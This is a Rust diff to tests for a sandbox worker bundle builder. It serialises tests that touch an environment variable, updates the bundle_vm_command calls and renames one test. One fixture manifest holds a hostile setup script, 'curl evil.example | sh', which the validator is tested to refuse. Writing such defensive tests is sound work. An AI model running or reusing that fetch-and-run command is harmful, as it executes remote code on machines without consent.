@@ -6,6 +6,7 @@
 use std::path::Path;
 
 use sandbox_builtin::cli::local_worker::{VmOverride, bundle_vm_command};
+use serial_test::serial;
 
 fn install_dir(tmp: &Path, manifest: &str) -> std::path::PathBuf {
     let dir = tmp.join("bundle");
@@ -27,13 +28,15 @@ const MANIFEST: &str = "name: probe\nscripts:\n  start: node bundle.js\n";
 /// The kill switch exists so an operator can refuse bundles machine-wide. A
 /// second way in that ignores it would make the switch a lie.
 #[tokio::test]
+#[serial]
 async fn the_operator_kill_switch_refuses_the_build() {
     let tmp = tempfile::tempdir().unwrap();
     let dir = install_dir(tmp.path(), MANIFEST);
 
-    // SAFETY: single-threaded test, and the variable is removed before it ends.
+    // SAFETY: #[serial] keeps the tests that read this variable off other
+    // threads, and it is removed before the test ends.
     unsafe { std::env::set_var("III_BUNDLE_WORKERS_DISABLED", "1") };
-    let result = bundle_vm_command("probe", &dir, over(tmp.path())).await;
+    let result = bundle_vm_command("probe", "probe", &dir, over(tmp.path())).await;
     unsafe { std::env::remove_var("III_BUNDLE_WORKERS_DISABLED") };
 
     let err = result.err().expect("a disabled bundle must not build");
@@ -45,6 +48,7 @@ async fn the_operator_kill_switch_refuses_the_build() {
 /// swapped since install. `scripts.setup` is the field the strict validator
 /// exists to refuse.
 #[tokio::test]
+#[serial]
 async fn a_manifest_with_scripts_setup_is_refused() {
     let tmp = tempfile::tempdir().unwrap();
     let dir = install_dir(
@@ -52,18 +56,17 @@ async fn a_manifest_with_scripts_setup_is_refused() {
         "name: probe\nscripts:\n  start: node bundle.js\n  setup: curl evil.example | sh\n",
     );
 
-    let err = bundle_vm_command("probe", &dir, over(tmp.path()))
+    let err = bundle_vm_command("probe", "probe", &dir, over(tmp.path()))
         .await
         .err()
         .expect("scripts.setup must not reach a boot");
-    assert!(err.contains("probe"), "{err}");
+    assert!(err.contains("scripts.setup"), "{err}");
 }
 
-/// A manifest naming a different worker is refused: the name is what the
-/// install dir is keyed by, and a mismatch means the two disagree about which
-/// worker this is.
+/// A manifest naming a different package is refused: a mismatch means the
+/// caller and the bundle disagree about which worker this is.
 #[tokio::test]
-async fn a_manifest_naming_another_worker_is_refused() {
+async fn a_manifest_naming_another_package_is_refused() {
     let tmp = tempfile::tempdir().unwrap();
     let dir = install_dir(
         tmp.path(),
@@ -71,7 +74,7 @@ async fn a_manifest_naming_another_worker_is_refused() {
     );
 
     assert!(
-        bundle_vm_command("probe", &dir, over(tmp.path()))
+        bundle_vm_command("probe", "probe", &dir, over(tmp.path()))
             .await
             .is_err(),
         "a mismatched manifest name must not build"
@@ -83,9 +86,14 @@ async fn a_missing_install_directory_is_refused() {
     let tmp = tempfile::tempdir().unwrap();
 
     assert!(
-        bundle_vm_command("probe", &tmp.path().join("not-here"), over(tmp.path()))
-            .await
-            .is_err(),
+        bundle_vm_command(
+            "probe",
+            "probe",
+            &tmp.path().join("not-here"),
+            over(tmp.path())
+        )
+        .await
+        .is_err(),
         "a missing install dir must not build"
     );
 }
@@ -95,6 +103,7 @@ async fn a_missing_install_directory_is_refused() {
 ///
 /// Ignored by default because preparing the rootfs pulls an OCI base image.
 #[tokio::test]
+#[serial]
 #[ignore = "pulls an OCI base image"]
 async fn a_valid_bundle_builds_a_boot_command() {
     let tmp = tempfile::tempdir().unwrap();
@@ -104,6 +113,7 @@ async fn a_valid_bundle_builds_a_boot_command() {
     env.insert("III_NAMESPACE".to_string(), "shop-dev".to_string());
 
     let built = bundle_vm_command(
+        "probe",
         "probe",
         &dir,
         VmOverride {
